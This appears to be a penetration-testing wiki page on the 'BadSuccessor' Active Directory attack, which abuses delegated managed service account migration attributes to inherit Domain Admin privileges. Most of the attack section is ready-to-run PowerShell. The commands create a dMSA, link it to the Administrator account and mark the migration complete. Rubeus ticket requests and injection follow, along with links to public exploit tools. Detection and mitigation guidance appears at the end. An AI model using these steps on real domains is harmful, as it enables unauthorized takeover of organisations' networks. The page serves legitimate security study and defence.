# BadSuccessor: Privilege Escalation via Delegated MSA Migration Abuse

{{#include ../../banners/hacktricks-training.md}}

## Overview

Delegated Managed Service Accounts (**dMSA**) are the next-generation successor of **gMSA** that ship in Windows Server 2025.  A legitimate migration workflow allows administrators to replace an *old* account (user, computer or service account) with a dMSA while transparently preserving permissions.  The workflow is exposed through PowerShell cmdlets such as `Start-ADServiceAccountMigration` and `Complete-ADServiceAccountMigration` and relies on two LDAP attributes of the **dMSA object**:

* **`msDS-ManagedAccountPrecededByLink`** – *DN link* to the superseded (old) account.
* **`msDS-DelegatedMSAState`**       – migration state (`0` = none, `1` = in-progress, `2` = *completed*).

If an attacker can create **any** dMSA inside an OU and directly manipulate those 2 attributes, LSASS & the KDC will treat the dMSA as a *successor* of the linked account.  When the attacker subsequently authenticates as the dMSA **they inherit all the privileges of the linked account** – up to **Domain Admin** if the Administrator account is linked.

This technique was coined **BadSuccessor** by Unit 42 in 2025.  At the time of writing **no security patch** is available; only hardening of OU permissions mitigates the issue.

### Attack prerequisites

1. An account that is *allowed* to create objects inside **an Organizational Unit (OU)** *and* has at least one of:
   * `Create Child` → **`msDS-DelegatedManagedServiceAccount`** object class
   * `Create Child` → **`All Objects`** (generic create)
2. Network connectivity to LDAP & Kerberos (standard domain joined scenario / remote attack).

## Enumerating Vulnerable OUs

Unit 42 released a PowerShell helper script that parses security descriptors of each OU and highlights the required ACEs:

```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```

Under the hood the script runs a paged LDAP search for `(objectClass=organizationalUnit)` and checks every `nTSecurityDescriptor` for

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (object class *msDS-DelegatedManagedServiceAccount*)

## Exploitation Steps

Once a writable OU is identified the attack is only 3 LDAP writes away:

```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
                     -DNSHostName host.contoso.local \
                     -Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
    @{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

After replication the attacker can simply **logon** as `attacker_dMSA$` or request a Kerberos TGT – Windows will build the token of the *superseded* account.

### Automation

Several public PoCs wrap the entire workflow including password retrieval and ticket management:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
* NetExec module – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

### Post-Exploitation

```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```

## Detection & Hunting

Enable **Object Auditing** on OUs and monitor for the following Windows Security Events:

* **5137** – Creation of the **dMSA** object
* **5136** – Modification of **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Specific attribute changes
  * GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
  * GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – TGT issuance for the dMSA

Correlating `4662` (attribute modification), `4741` (creation of a computer/service account) and `4624` (subsequent logon) quickly highlights BadSuccessor activity.  XDR solutions such as **XSIAM** ship with ready-to-use queries (see references).

## Mitigation

* Apply the principle of **least privilege** – only delegate *Service Account* management to trusted roles.
* Remove `Create Child` / `msDS-DelegatedManagedServiceAccount` from OUs that do not explicitly require it.
* Monitor for the event IDs listed above and alert on *non-Tier-0* identities creating or editing dMSAs.

## See also


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [Unit42 – When Good Accounts Go Bad: Exploiting Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [NetExec BadSuccessor module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

{{#include ../../banners/hacktricks-training.md}}
